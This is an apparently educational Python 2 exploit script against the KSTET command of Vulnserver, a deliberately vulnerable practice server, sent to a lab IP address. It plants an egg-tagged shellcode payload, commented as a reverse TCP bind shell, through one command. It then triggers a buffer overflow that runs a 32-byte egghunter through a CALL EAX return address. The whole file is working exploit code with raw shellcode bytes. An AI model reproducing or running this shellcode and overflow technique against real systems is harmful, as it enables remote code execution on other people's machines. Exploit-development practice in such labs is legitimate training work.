# Author: Xavi Bel
# Date: 26/06/2019
# Website: xavibel.com
# Vulnserver KSTET - Method 1

#!/usr/bin/python
import socket
import os
import sys
import time

# Connection
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.35.131", 9999))
print expl.recv(1024)

# First buffer:
#       EGGx2
#       Shellcode

# Reverse TCP Bind Shell
# Payload size: 351 bytes
shellcode =  ""
shellcode += "\xb8\x41\xdb\x4c\xdd\xdb\xcc\xd9\x74\x24\xf4\x5b\x33"
shellcode += "\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\x02\xd5\xae"
shellcode += "\x28\x78\x01\xac\xd3\x80\xd2\xd1\x5a\x65\xe3\xd1\x39"
shellcode += "\xee\x54\xe2\x4a\xa2\x58\x89\x1f\x56\xea\xff\xb7\x59"
shellcode += "\x5b\xb5\xe1\x54\x5c\xe6\xd2\xf7\xde\xf5\x06\xd7\xdf"
shellcode += "\x35\x5b\x16\x27\x2b\x96\x4a\xf0\x27\x05\x7a\x75\x7d"
shellcode += "\x96\xf1\xc5\x93\x9e\xe6\x9e\x92\x8f\xb9\x95\xcc\x0f"
shellcode += "\x38\x79\x65\x06\x22\x9e\x40\xd0\xd9\x54\x3e\xe3\x0b"
shellcode += "\xa5\xbf\x48\x72\x09\x32\x90\xb3\xae\xad\xe7\xcd\xcc"
shellcode += "\x50\xf0\x0a\xae\x8e\x75\x88\x08\x44\x2d\x74\xa8\x89"
shellcode += "\xa8\xff\xa6\x66\xbe\xa7\xaa\x79\x13\xdc\xd7\xf2\x92"
shellcode += "\x32\x5e\x40\xb1\x96\x3a\x12\xd8\x8f\xe6\xf5\xe5\xcf"
shellcode += "\x48\xa9\x43\x84\x65\xbe\xf9\xc7\xe1\x73\x30\xf7\xf1"
shellcode += "\x1b\x43\x84\xc3\x84\xff\x02\x68\x4c\x26\xd5\x8f\x67"
shellcode += "\x9e\x49\x6e\x88\xdf\x40\xb5\xdc\x8f\xfa\x1c\x5d\x44"
shellcode += "\xfa\xa1\x88\xcb\xaa\x0d\x63\xac\x1a\xee\xd3\x44\x70"
shellcode += "\xe1\x0c\x74\x7b\x2b\x25\x1f\x86\xbc\xe6\xf0\xab\xbd"
shellcode += "\x9f\xf2\xab\xbc\xe4\x7a\x4d\xd4\x0a\x2b\xc6\x41\xb2"
shellcode += "\x76\x9c\xf0\x3b\xad\xd9\x33\xb7\x42\x1e\xfd\x30\x2e"
shellcode += "\x0c\x6a\xb1\x65\x6e\x3d\xce\x53\x06\xa1\x5d\x38\xd6"
shellcode += "\xac\x7d\x97\x81\xf9\xb0\xee\x47\x14\xea\x58\x75\xe5"
shellcode += "\x6a\xa2\x3d\x32\x4f\x2d\xbc\xb7\xeb\x09\xae\x01\xf3"
shellcode += "\x15\x9a\xdd\xa2\xc3\x74\x98\x1c\xa2\x2e\x72\xf2\x6c"
shellcode += "\xa6\x03\x38\xaf\xb0\x0b\x15\x59\x5c\xbd\xc0\x1c\x63"
shellcode += "\x72\x85\xa8\x1c\x6e\x35\x56\xf7\x2a\x45\x1d\x55\x1a"
shellcode += "\xce\xf8\x0c\x1e\x93\xfa\xfb\x5d\xaa\x78\x09\x1e\x49"
shellcode += "\x60\x78\x1b\x15\x26\x91\x51\x06\xc3\x95\xc6\x27\xc6"

buffer2  = "GDOG "
buffer2 += "T00WT00W"
#buffer2 += "\xCC" * 105 + "\x44" + "\x45" * 5000
buffer2 += "\x90" * 8
buffer2 += shellcode
buffer2 += "\x90" * 8
buffer2 += "\r\n"

print "[+] Sending exploit part 1!"
expl.send(buffer2)
print expl.recv(1024)

time.sleep(5)

# Egghunter
# 32 bytes length
# EGG W00TW00T
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x54\x30\x30\x57\x89\xD7\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# \x20\x20\x20          - Access violation fix
# 62501084              - CALL EAX stored in vulnserver dll
crash = "\x20" * 3 + egghunter + "\x90" * 35 + "\x84\x10\x50\x62" + "C" * 19 + "D" + "E" * 5000

buffer  ="KSTET "
buffer += crash + "\r\n"
print "[+] Sending exploit part 2!"

expl.send(buffer)
expl.close()
